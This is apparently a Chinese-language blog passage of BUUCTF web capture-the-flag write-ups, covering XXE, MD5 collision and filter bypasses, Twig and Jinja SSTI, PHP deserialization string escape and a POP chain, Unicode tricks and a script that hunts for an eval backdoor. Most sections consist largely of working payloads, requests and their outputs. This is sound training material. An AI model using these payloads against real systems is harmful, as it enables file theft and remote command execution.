<!DOCTYPE root[                                                 
<!ENTITY xxe SYSTEM "file:///flag">]>

<user><username>&xxe;</username><password>asdf</password></user>
```

这里自定义变量`&xxe`的值就是`SYSTEM "file:///flag"` 

通过响应页面对`username`标签的回显,将这段代码的执行结果,也就是读取`/flag`的内容输出

<img src="/images/buuctf-web/image-20221020120500948-1667047819735118.png" alt="image-20221020120500948" style="zoom:67%;" />

<br>

***

<br>

# [md5强比较绕过]easy_web



进来看到`url`中有两个参数:

```
index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=
```

源码里有提示: `md5`相关

<img src="/images/buuctf-web/image-20221020145903227.png" alt="image-20221020145903227" style="zoom:67%;" />..



<img src="/images/buuctf-web/image-20221020153441156-1667047819735119.png" alt="image-20221020153441156" style="zoom: 80%;" />

```
php://filter/read=convert.base64-encode/resource=index.php:
7068703a2f2f66696c7465722f726561643d636f6e766572742e6261736536342d656e636f64652f7265736f757263653d696e6465782e706870
index.php:
696e6465782e706870
```



```
index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&cmd=
```

<img src="/images/buuctf-web/image-20221020154152153-1667047819735120.png" alt="image-20221020154152153" style="zoom:67%;" />

解密得到`index.php`的源码:

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img']))); //对file进行两次base64解码,然后从16进制转为2进制

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) { //file中不能包含"flag"
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else { 
    $txt = base64_encode(file_get_contents($file));  //读取的file内容进行base64编码
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    // cmd中的过滤字符
    echo("forbid ~"); 
    echo "<br>";
} 
	else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;  
    } else {
        echo ("md5 is funny ~");
    }
}

?>
```

27行中,php中**用反引号包裹的变量**, **会将变量值当作`shell`命令来执行**,并返回执行结果

所以这里就是让`cmd`避开过滤字符执行系统命令

同时还要POST两个变量a和b,它们转字符串之后的值不相等,但md5值相等

这里由于使用了`===`强相等, 所以之前使用的数组绕过,`0e`绕过等就无法使用了

这里利用md5碰撞工具`fastcoll`,产生两个md5值相同的2进制文件

```
E:\CTF工具合集\md5碰撞\fastcoll_v1.0.0.5.exe>fastcoll_v1.0.0.5.exe -o a b
MD5 collision generator v1.5
by Marc Stevens (http://www.win.tue.nl/hashclash/)

Using output filenames: 'a' and 'b'
Using initial value: 0123456789abcdeffedcba9876543210

Generating first block: .
Generating second block: S11.
Running time: 0.153 s
```

<img src="/images/buuctf-web/image-20221020163346764-1667047819735121.png" alt="image-20221020163346764" style="zoom:67%;" />

在`burpsuite`的`repeater`中右键:`paste from file`,加载文件后选中右键-`send to decoder`(注意,直接复制到`decoder`中的话不是对二进制进行编码,结果会不一样), 然后进行URL编码:

<img src="/images/buuctf-web/image-20221020163559394-1667047819735122.png" alt="image-20221020163559394" style="zoom:67%;" />

将编码后的内容分别复制给a和b

```
a=%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%6c%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%4d%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%4d%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%4e%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%0b%df%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%ce%5f%ea%a5%e3&b=%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%ec%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%cd%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%cd%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%ce%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%8b%de%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%4e%5f%ea%a5%e3
```

运行一下,响应包中没有`forbid ~`, 说明成功绕过了`md5`强比较

<img src="/images/buuctf-web/image-20221020163652761-1667047819735123.png" alt="image-20221020163652761" style="zoom:80%;" />

下一步该考虑怎样绕过过滤字符来执行命令了

知识点: php中`preg_match`这里对反斜杠的过滤是有问题的

对反引号的检测无效，而在Linux中，反引号对一些命令也几乎没有影响

所以在常规命令里加一个反斜杠,一方面反斜杠无法被过滤,另一方面也导致命令也不会被过滤了:

<img src="/images/buuctf-web/image-20221020164005294-1667047819735124.png" alt="image-20221020164005294" style="zoom:67%;" />

````
cmd=l\s+/   相当于执行了ls /   这里`+`是url中的连接符
cmd=ca\t+/flag  
````

<img src="/images/buuctf-web/image-20221020164200800-1667047819735125.png" alt="image-20221020164200800" style="zoom:67%;" />

<br>

***

<br>

# [脚本爆破]高明的黑客

## 写脚本遍历

<img src="/images/buuctf-web/image-20221020171427555-1667047819735126.png" alt="image-20221020171427555" style="zoom:67%;" />

下载`www.tar.gz`后查看源码,发现变量名和文件名等等都被混淆过,完全没法读懂代码

简单看一下,搜索一下敏感函数,发现存在很多`eval`直接执行GET和POST参数的情况:

<img src="/images/buuctf-web/image-20221020172010484-1667047819735127.png" alt="image-20221020172010484" style="zoom:67%;" />

那么很可能存在命令执行漏洞,现在需要找出哪个具体文件的具体参数会导致命令执行

把网站源码放在本地跑起来,便于测试:

<img src="/images/buuctf-web/image-20221020172210664-1667047819735128.png" alt="image-20221020172210664" style="zoom:67%;" />





```
        file_content = f.read()
        get_x = re.findall(r"\$\_GET\['(.*?)'\]", file_content)
        post_x = re.findall(r"\$\_POST\['(.*?)'\]", file_content)
        print(get_x)
        print(post_x)

['XSDcSaffEbx6oZ', 'oz6Ej9P', 'az3R5f5s4', 'odtEQDItUT', 'NSgdqC', 'H4is8Z3LRoABM', 'ilv84RCQ', 'lww0c2Cx7y4TSRGi', 'Kwz6bXz2M', 'aNumqn2f', 'Fqb2uSrO8LMMB', 'jDT01_l', 'goch7KojU7T', 'qWm5RvJUt', 'qWm5RvJUt', 'BORTqm2Eo7A', 'nNSyzVRp1', 'nNSyzVRp1', 'fF8bAiWdOBLwZL9', 'frGFotiaH', 'hI7_X5i4R', 'hI7_X5i4R', 'FTxP0MHycmnFRtpz', 'Epwu9JxhOy', 'HyXW_N_4K2c', 'rdxi8mF', 'Ej3PC3fzf', 'JuB3q6twZW', 'yvBMQa0', 'iz6OwNzo3akf0', 'FR7mSIquukKmAHcB', 'x0ySdn', 'P1xbo5J6PutjgW', 'WJItkno6C', 'K3fy91AWDXdjly7', 'kI8X1sjYP', 'cbbhyBPGJ3omu']
['c9tNeilUCYtuI_rW', 'GeSLNjbPhXFZTiU', 'zSBU5aRPV', 'EAwdIy7bl', 'bcWLBqVE', 'McfP0gwMy1Os', 'pIUHGWlCT_q', 'M5fIjgYMC1sybG3', 'KNzF8hev3', 'WGl60iQiCS', 'LdfrqXGQVtS', 'TETrtgSbwwSzl', 'nCXHgSWve', 'SzHhNCR76__IZY', 'rqVPmr', 'vuXMcABwIGPtivYT', 'VCXnjK4Qo5L2NKL', 'eoOoQHH1c', 'XystQX6Go_qu', 'fbcvPysDv', 'y4J9xESQbt_xvL8H', 'zRimyMWsH9ukp', 'axQvvHWB_1hdC', 'MfhwcPtHxG_GG4', 'zbVFQDcHKqZz9eR', 'K4w8M3WWbLtt_m4x', 'cZN6BUQ', 'qz9u5FQC5']

```

写一个脚本来测试出问题的是哪个文件中的哪个参数:

```python
import os
import requests
import re

filelist = os.listdir("./src")
base_url = "http://127.0.0.1:8090/src/"
payload = "echo 'ffffllllaaaagggg';"


for file in filelist:
    with open("./src/"+file, "r",encoding='utf-8') as f:
        file_content = f.read()
        get_x = re.findall(r"\$\_GET\['(.*?)'\]", file_content)# 正则匹配出当前文件中所有的get参数名
        post_x = re.findall(r"\$\_POST\['(.*?)'\]", file_content)# 正则匹配出当前文件中所有的post参数名
        print("now:{}".format(file))

        data = {}  # 用来post的参数
        params = {}  # 用来get的参数
        for i in get_x:
            params[i] = payload
        for j in post_x:
            data[j] = payload
        url = base_url+file
        # print(url)
        session0 = requests.session()
        response = session0.post(url, data=data, params=params).text   # 外层,测试可利用的是哪个文件
        print(1)
        if 'ffffllllaaaagggg' in response:
            print("this!!!!!!!!{}".format(file))   # 内层,测试可利用的是这个文件里的哪个参数

            for param in get_x:# 测试get参数
                session1 = requests.session()
                params_per = {param: payload}
                res = session1.get(url, params=params_per).text
                if 'ffffllllaaaagggg' in res:
                    print("this!!!!!!!{}".format(param))
                    break
            for data in post_x:# 测试post参数
                session2 = requests.session()
                data_per = {data: payload}
                res = session2.post(url, data=data_per).text
                if 'ffffllllaaaagggg' in res:
                    print("this!!!!!!!{}".format(data))
                    break
            break

```



<img src="/images/buuctf-web/image-20221020181021597.png" alt="image-20221020181021597" style="zoom:80%;" />

```
this!!!!!!!!xk0SzyKwfzw.php
this!!!!!!!Efa5BVG
```

接下来直接借助这个参数执行命令就可以了:

```
http://33bb5a31-74a7-444e-8ffb-fd4095be3912.node4.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=ls /
```

<img src="/images/buuctf-web/image-20221020181610785-1667047819735129.png" alt="image-20221020181610785" style="zoom:67%;" />

```
http://33bb5a31-74a7-444e-8ffb-fd4095be3912.node4.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=cat /flag
```

<br>

***

<br>

# [Cookie-SSTI]Cookie is so stable

进来之后`hint`中提示说看一下`cookies`,所以抓包看一下`cookie`

经过抓包可以看出,在`Flag`页面输入的字符串会出现在回显页面上, 那么这题考的应该是`SSTI`

<img src="/images/buuctf-web/image-20221020212947194-1667047819735130.png" alt="image-20221020212947194" style="zoom:67%;" />

尝试判断一下网站的类型:

<img src="/images/buuctf-web/1-1667047819735131.png" alt="image-20221016171017464" style="zoom:67%;" />

```
Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user=${7*7}  没有运算,直接输出
```

<img src="/images/buuctf-web/image-20221020210024205-1667047819735132.png" alt="image-20221020210024205" style="zoom:67%;" />



```
Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user={{7*7}} 运算了
```

<img src="/images/buuctf-web/image-20221020210112518-1667047819735133.png" alt="image-20221020210112518" style="zoom:67%;" />



```
Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user={{7*'7'}} 运算了
```

<img src="/images/buuctf-web/image-20221020210150775-1667047819735134.png" alt="image-20221020210150775" style="zoom:80%;" />

这样以来, 网站框架应该是`Twig(php)`或者`Jinja2(python)`

直接找对应的payload过来尝试,目标是执行命令`cat /flag`

```
Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

<img src="/images/buuctf-web/image-20221020212707869.png" alt="image-20221020212707869" style="zoom:67%;" />



<br>

***

<br>

# [intvalr绕过,md5爆破]朴实无华

<img src="/images/buuctf-web/image-20221020222547896.png" alt="image-20221020222547896" style="zoom:80%;" />

访问`robots.txt`:

<img src="/images/buuctf-web/image-20221020222618709.png" alt="image-20221020222618709" style="zoom:80%;" />

```
User-agent: *
Disallow: /fAke_f1agggg.php
```

访问一下这个文件:

<img src="/images/buuctf-web/image-20221020222910649-1667047819736135.png" alt="image-20221020222910649" style="zoom:67%;" />

抓包又发现了一个文件:

<img src="/images/buuctf-web/image-20221020223050808-1667047819736136.png" alt="image-20221020223050808" style="zoom:67%;" />

访问得到了源码: (做的时候汉字乱码了..直接网上找了一个..)

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){ // get_flag中不能有空格
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag); //将cat换成wctf2020
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>

```

`level1:` `intval`获取变量整数值

这里`if(intval($num) < 2020 && intval($num + 1) > 2021)` 可以利用运算时进行转换的性质

例如传`123e12`, `intval($num)`时,取到字母就会停止,所以是123

但是在进行运算时,会把它整体强制转换成数值,**这里的`e`会被当成科学计数法**,所以`intval($num + 1) > 2021`也成立

<br>

`level2`中,首先需要一个`md5`计算后等于原值的值,这里利用

`0e`开头的字符串在参与比较时,**会被当做科学计数法**,结果转换为0   这个性质

需要找一个以`0e`开头,且`md5`计算后仍为`0e`开头的字符串,且除了`0e`之外必须全是数字

这里只能用脚本碰撞了:

```php
from hashlib import md5
i = 0
while True:
    a = '0e' + str(i)
    m = md5(a.encode()).hexdigest()
    print(i)
    if m[:2] == '0e' and m[2:].isdigit():
        print('OK!!!!!!!!!1',a)
        break
    i += 1
```

结果:

```
0e215962017
```



```
http://ed5aace2-3cdb-472b-9bd0-c403a02807ad.node4.buuoj.cn:81/fl4g.php?num=123e12&md5=0e215962017&get_flag=ls
输出:
404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt
```

```
/fl4g.php?num=123e12&md5=0e215962017&get_flag=more${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```

<img src="/images/buuctf-web/image-20221020230400979.png" alt="image-20221020230400979" style="zoom:80%;" />





<br>

***

<br>

#  [长度减少的反序列化字符串逃逸]easy_serialize_php

进来点链接,有源码,url中用参数`f`传了一个调用的函数

```
/index.php?f=highlight_file
```

```php
 <?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i'; //将数组转化为字符串,并使用|分割,这里构造了一个正则匹配表达式
    return preg_replace($filter,'',$img); //将匹配到的替换为空,这里只是替换的化可以双写绕过
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST); //将数组(字典)中的每个元素解析为单独的变量

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```

先分析

```
$SESSION中:
$_SESSION["user"] = 'guest'
$_SESSION['function'] = $function  用户传进来的参数f, 这里应该是show_image
$_SESSION['img'] GET传一个img_path参数,先base64编码,再计算sha1
```

给`function`传一下`phpinfo`,从`phpinfo`中得到提示,那么现在应该设法通过39行的` file_get_contents`来读取`d0g3_f1ag.php`

<img src="/images/buuctf-web/image-20221021090023073.png" alt="image-20221021090023073" style="zoom:80%;" />

上面代码中,28行自己传`img_path`的话,这个值不仅要被编码,还要再计算一次`sha1`,但是最后读文件的时候只会对其进行一次解码,完全对不上,所以这条路走不通.  那么就不要传`img_path`,让其执行26行的

```
$_SESSION['img'] = base64_encode('guest_img.png');
```

**注意到19行的`extract($_POST);` 这就使得我们通过`POST`传的参数可以覆盖前面已经定义好的参数**

本地模拟一下:

```php
<?php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i'; //将数组转化为字符串,并使用|分割,这里构造了一个正则匹配表达式
    return preg_replace($filter,'',$img); //将匹配到的替换为空,这里只是替换的化可以双写绕过
}
$_SESSION["user"] = 'guest';
$_SESSION['function'] = 'show_image';
extract($_POST);

$_SESSION['image_path'] = (base64_encode('guest_img.png'));


echo serialize($_SESSION);
echo '<br>';
$serialize_info = filter(serialize($_SESSION));
$userinfo = unserialize($serialize_info);

echo $serialize_info;
echo '<br>';
var_dump($userinfo);

?>
```

先不传POST, 输出:

```
a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:10:"image_path";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:10:"image_path";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
array(3) { ["user"]=> string(5) "guest" ["function"]=> string(10) "show_image" ["image_path"]=> string(20) "Z3Vlc3RfaW1nLnBuZw==" }
```

POST中输入:  这里发现不仅`_SESSION[user]`的值被修改了,**而且`$_SESSION['function']`还被覆盖了**

```
_SESSION[user]=admin
输出:
a:2:{s:4:"user";s:5:"admin";s:10:"image_path";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
a:2:{s:4:"user";s:5:"admin";s:10:"image_path";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
array(2) { ["user"]=> string(5) "admin" ["image_path"]=> string(20) "Z3Vlc3RfaW1nLnBuZw==" }
```

POST中输入,这里可以向`_SESSION`中加入新的参数

```
_SESSION[user]=admin&_SESSION[abc]=abcd
输出
a:3:{s:4:"user";s:5:"admin";s:3:"abc";s:4:"abcd";s:10:"image_path";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
a:3:{s:4:"user";s:5:"admin";s:3:"abc";s:4:"abcd";s:10:"image_path";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
array(3) { ["user"]=> string(5) "admin" ["abc"]=> string(4) "abcd" ["image_path"]=> string(20) "Z3Vlc3RfaW1nLnBuZw==" }
这里发现_SESSION中原有的function被覆盖了
```

那么现在的目标是设法让最后的`img`失效,并且替换成我们自己可控的`img`

这里给`_SESSION[a]`传`aa";s:3:"img";s:5:"abcde";}` 第一个右双引号提前闭合本来包裹它的左双引号,最后使用`}`提前闭合整个序列化的字符串,这样以来,原有的`img`就被排除在了外面, 但是从下面反序列化的结果也可以看出,反序列化之后,原来的`img`仍然在这个数组中,而我们传的那个`img`仍被算在`_SESSION[a]`中

```
a:3:{s:4:"user";s:5:"sssss";s:1:"a";s:27:"aa";s:3:"img";s:5:"abcde";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
a:3:{s:4:"user";s:5:"sssss";s:1:"a";s:27:"aa";s:3:"img";s:5:"abcde";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
array(3) { ["user"]=> string(5) "sssss" ["a"]=> string(27) "aa";s:3:"img";s:5:"abcde";}" ["img"]=> string(20) "Z3Vlc3RfaW1nLnBuZw==" }
```

那么现在需要利用一下前面的过滤函数,打乱前面的引号配对关系,让系统在反序列化时把我们自己传的这个`img`当作`_SESSION`中的元素

这里我们需要把序列化字符串中,`img`之前的内容,也就是 `";s:1:"a";s:27:"aa` 这一段都归入`_SESSION[user]`的值,这一段的长度是18,那么就让序列化字符串中`user`的值的长度显示为18, 所以这里给`user`传`flagflagflagphpphp`,这个串中的所有字符都会被过滤函数替换为空,所以处理后的序列化字符串也就变成了下面代码框中第二个这样. 这里:

`s:4:"user";s:18:"`**`";s:1:"a";s:27:"aa`**`";s:3:"img";s:5:"abcde";` 

`user`的值实际上是加粗的这一段,其长度为18. 因此,在反序列化时,系统就会按照18的长度去匹配后面的值

```
_SESSION[user]=flagflagflagphpphp&_SESSION[a]=aa";s:3:"img";s:5:"abcde";}
a:3:{s:4:"user";s:18:"flagflagflagphpphp";s:1:"a";s:27:"aa";s:3:"img";s:5:"abcde";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
a:3:{s:4:"user";s:18:"";s:1:"a";s:27:"aa";s:3:"img";s:5:"abcde";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
bool(false)
```

但上面最后反序列化输出了`false`,其原因是经过上面的处理过后, 这个数组实际上就剩两个参数了(`user`和我们自己传的`img`),但序列化的字符串起始还标记着有三个参数,自然反序列化就失败了

所以这里再从`img`后面添加一个无关紧要的参数即可

可以看到这里反序列化成功了,且成功地将原有的`img`替换成了我们可控的`img`

```
_SESSION[user]=flagflagflagphpphp&_SESSION[a]=aa";s:3:"img";s:5:"abcde";s:1:"b";s:1:"c";}
输出:
a:3:{s:4:"user";s:18:"flagflagflagphpphp";s:1:"a";s:43:"aa";s:3:"img";s:5:"abcde";s:1:"b";s:1:"c";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
a:3:{s:4:"user";s:18:"";s:1:"a";s:43:"aa";s:3:"img";s:5:"abcde";s:1:"b";s:1:"c";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
array(3) { ["user"]=> string(18) "";s:1:"a";s:43:"aa" ["img"]=> string(5) "abcde" ["b"]=> string(1) "c" }
```

所以拿到这道题里,把`img`的值换成我们所需读取的`d0g3_f1ag.php`的`base64`编码: 注意长度那里也得改

```
_SESSION[user]=flagflagflagphpphp&_SESSION[a]=aa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"b";s:1:"c";}
源码里输出:
<?php
$flag = 'flag in /d0g3_fllllllag';
?>
```

那么继续去读取这个文件:

```
_SESSION[user]=flagflagflagphpphp&_SESSION[a]=aa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:1:"b";s:1:"c";}

输出flag
```



这里用到了字符串逃逸,变量覆盖. 提前闭合引号和花括号,理解起来有点像`sql`注入时的一些场景

<br>

***

<br>

# [unicode欺骗]Unicorn shop

<img src="/images/buuctf-web/image-20221021115425088-1667047819736138.png" alt="image-20221021115425088" style="zoom:67%;" />

```
id=1&price=2  ---Wrong commodity!
id=1&price=a  ---Error parsing money!
id=1&price=a2 ---Only one char(?) allowed!
id=&price=2  ---No commodity found!
id=1&price=
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/site-packages/tornado/web.py", line 1541, in _execute
    result = method(*self.path_args, **self.path_kwargs)
  File "/app/sshop/views/Shop.py", line 34, in post
    unicodedata.numeric(price)
TypeError: need a single Unicode character as parameter


id=4&price=0  --You don&#39;t have enough money!
```

只能买第四件商品才不会报错, 而且`price`还只能输入1个字符,无法输入1337



<img src="/images/buuctf-web/image-20221021114227729.png" alt="image-20221021114227729" style="zoom:80%;" />



**`unicode`欺骗**,

去[unicode-table](https://unicode-table.com/en/search/?q=thousand)找一个比1337大的单个字符

<img src="/images/buuctf-web/image-20221021115803524-1667047819736137.png" alt="image-20221021115803524" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221021115650004-1667047819736139.png" alt="image-20221021115650004" style="zoom:67%;" />



<br>

***

<br>

# [反序列化pop链]Ezpop

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);  
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

突破口是`Modifier`类的`append`方法, 进行文件包含

调用`append`的是`__invoke`, **这个魔术方法在尝试将对象调用为函数时触发.** 

为了达到最终`include`的目的调用它的时候需要`Modifier`中的`var`属性值需要是我们要读取的`flag.php`

那么现在需要找哪里能够把变量当函数调用, 这里找到第43行,`Test`类的`__get`方法,这个魔术方法在**读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）**

那么这里就需要`$function`的值是`Modifier`的一个对象

42行,`function变量`赋值于`Test`的`p`属性,它初始化时是一个新建立的数组

那么如何调用`__get`呢,这里看到24行的`__toString`中调用了尚未初始化的的`str`

最后`Show`类中`__wakeup`方法的`preg_match`能够触发`__toString`方法

最后反序列化一个`show`类的对象,就能够触发其`__wakeup`方法

那么把上述过程反推,就可以构造pop链:

```php
<?php

class Modifier {
    protected  $var = "php://filter/read=convert.base64-encode/resource=flag.php";
}
class Test{
    public $p;
}
class Show{
    public $source;
    public $str;
}

$a = new Modifier();
$b = new Test();
$c = new Show();
$d = new Show();

$b->p = $a; 
$c->str = $b;
$d->source = $c;

$result = serialize($d);
echo $result;
echo '<br>';
echo urlencode($result);
?>
/*
过程分析: 首先这里拿到了$d序列化后的字符串,当这个字符串送到题目程序里进行反序列化时:
1.触发$d的__wakeup, 对$d->source,也就是$c进行正则匹配,这个过程把$c当成字符串,所以触发了$c的__tostring
2.$c的__tostring返回的是$c->str->source,而$c->str是$b,所以这里返回的是$b->str,而$b中这个属性并不存在,所以触发了$b的__get方法.
3.$b的__get方法会将$b->p,也就是$a当作函数执行,由此触发$a的__invoke方法
4.$a的__invoke方法调用$a的append方法,最终执行了include("php://filter/read=convert.base64-encode/resource=flag.php")
*/
```

输出:

```
O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"*var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}
O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```

<br>

***

<br>

# [SSTI,绕过过滤读取config]shrine

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()
# 注入点:
@app.route('/shrine/<path:shrine>') #这里可以根据用户输入的对应位置的url来获取对应位置的变量shrine值(path是类型)
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '') #把括号替换成空值
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine)) #渲染函数,将处理后的shrine变量渲染到网页中

if __name__ == '__main__':
    app.run(debug=True)

```

`SSTI`题注入点在URL中:

```
http://d867c53e-04fe-4b35-ad90-7d68985784b5.node4.buuoj.cn:81/shrine/abc
```

<img src="/images/buuctf-web/image-20221021163526067-1667047819736141.png" alt="image-20221021163526067" style="zoom:67%;" />



<img src="/images/buuctf-web/image-20221021163626656-1667047819736140.png" alt="image-20221021163626656" style="zoom:67%;" />



目标是访问到`config`这个字典数组,其中的`config['FLAG']`存储了所需的值. 

**`join`的作用是将序列中的元素以指定元素连接**
**`"''.join`就是通过空字符来连接,所以结果就是**

```
{{% set config=None%}}{{% set config=None%}}+s  这里s是我们注入的内容
```

所以这里是将`config`和`self`对象设置为了`none`

如果没有这一步处理,直接通过:

```
{{config['FLAG']}} 或者 {{config.FLAG}}
```

就能够获得flag了,但是现在需要绕过对`config`的处理

